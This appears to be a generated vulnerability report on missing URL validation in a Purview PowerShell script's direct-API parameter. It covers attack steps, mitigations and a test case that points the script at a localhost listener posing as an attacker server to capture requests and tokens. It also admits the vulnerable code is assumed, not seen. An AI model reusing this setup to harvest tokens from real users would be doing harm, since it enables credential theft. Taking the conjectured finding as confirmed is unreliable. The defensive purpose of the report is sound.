- Vulnerability Name: Insufficient URL Validation in `-PurviewAPIDirectURL` parameter
- Description:
  1. An attacker crafts a malicious URL pointing to an attacker-controlled server or unintended resource, instead of a legitimate Azure Purview API endpoint.
  2. The attacker social engineers a user to execute the `Purview-API-PowerShell.ps1` script (assuming this is the main script of the module) in Batch Mode.
  3. The user is tricked into using the `-APIDirect` parameter and providing the malicious URL as the value for the `-PurviewAPIDirectURL` parameter when running the script.
  4. The PowerShell script, due to the absence or inadequacy of URL validation, directly uses the provided URL to make an API request.
  5. The request is then sent to the attacker-specified malicious URL instead of the intended Azure Purview endpoint.
  6. Depending on the attacker's malicious server setup, this can lead to:
    - Information Disclosure: If the script sends sensitive information (like authentication tokens or data from Purview) as part of the request, the attacker can capture this data.
    - Client-Side Vulnerabilities: If the attacker's server responds with malicious content that the PowerShell script processes (though less likely in this API interaction context), it could potentially lead to further client-side exploits.
    - Open Redirect: In some scenarios, if the script processes redirects from the malicious URL, it might lead to open redirect vulnerabilities, although less relevant in API context.
- Impact:
  - Information Disclosure: Sensitive data intended for Azure Purview APIs could be exposed to an unauthorized third party if the script sends data to the malicious URL.
  - Potential for further exploitation: Although less direct, successful exploitation could be a stepping stone for more complex attacks depending on what information is disclosed and how the script processes API responses (if attacker mimics Purview API).
- Vulnerability Rank: Medium
- Currently Implemented Mitigations:
  - None identified in the provided project files. The vulnerability description explicitly mentions "insufficient URL validation".
- Missing Mitigations:
  - Implement robust URL validation for the `-PurviewAPIDirectURL` parameter within the `Purview-API-PowerShell.ps1` script.
  - Validate the scheme of the URL to ensure it is `https` to prevent man-in-the-middle attacks and ensure secure communication.
  - Validate the host of the URL to ensure it belongs to the expected Azure Purview domain (`*.purview.azure.com`). Implement a whitelist of allowed domain patterns or use a secure method to resolve and verify the target domain.
  - Sanitize or reject URLs that do not conform to the expected format.
- Preconditions:
  - The user must have downloaded and be using the `Purview-API-PowerShell` module.
  - The user must choose to use the Batch Mode with the `-APIDirect` parameter.
  - The attacker must successfully social engineer the user into providing a malicious URL as the value for the `-PurviewAPIDirectURL` parameter.
- Source Code Analysis:
  - **Assumed vulnerable code:** Without access to `Purview-API-PowerShell.ps1`, we assume the code directly uses the `-PurviewAPIDirectURL` parameter value to construct the API request URI without any validation.
  - **Example of vulnerable code (conceptual PowerShell):**
    ```powershell
    param (
        [Parameter(Mandatory=$true)]
        [string]$PurviewAPIDirectURL,
        [Parameter(Mandatory=$true)]
        [string]$HTTPMethod
        # ... other parameters
    )

    $apiUrl = $PurviewAPIDirectURL # Vulnerable line - directly using user input

    # ... code to construct and send API request using $apiUrl and $HTTPMethod
    ```
  - **Visualization:**
    ```
    User Input (Malicious URL) --> -PurviewAPIDirectURL Parameter --> PowerShell Script --> HTTP Request (to Malicious URL) --> Attacker Server
    ```
- Security Test Case:
  1. **Setup Attacker Server:**  Use a tool like `netcat` or a simple Python HTTP server to set up a listener on your local machine (e.g., port 8080). For example, using Python: `python -m http.server 8080`. This server will log any incoming requests.
  2. **Prepare Malicious URL:** Construct a malicious URL pointing to your attacker server, for example: `http://localhost:8080/api/malicious`.
  3. **Execute PowerShell Script with Malicious URL:** Open PowerShell and execute the `Purview-API-PowerShell.ps1` script (you would need to have this script). Use the `-APIDirect`, `-HTTPMethod GET`, and `-PurviewAPIDirectURL` parameters, providing the malicious URL from step 2. For example:
     ```powershell
     Purview-API-PowerShell.ps1 -APIDirect -HTTPMethod GET -PurviewAPIDirectURL "http://localhost:8080/api/malicious" -PurviewAccountName "your_purview_account_name" #replace with actual account name if needed for script execution
     ```
     Note: You might need to provide a dummy `PurviewAccountName` or other mandatory parameters for the script to run without errors, even though the core vulnerability is in `-PurviewAPIDirectURL`.
  4. **Observe Attacker Server Logs:** Check the logs of your attacker server (the Python HTTP server or `netcat` output).
  5. **Verify Vulnerability:** If you see a log entry on your attacker server indicating an incoming GET request to `/api/malicious`, it confirms that the PowerShell script made a request to the attacker-controlled URL. This demonstrates the insufficient URL validation vulnerability.
  6. **Further Testing (Optional):**
     - Try different schemes like `http` (if HTTPS is expected), different domains, or IP addresses to see if any basic validation is present.
     - Examine if sensitive data (like headers, authentication tokens if applicable in this scenario) are sent to the malicious server by inspecting the logged request details on the attacker server.
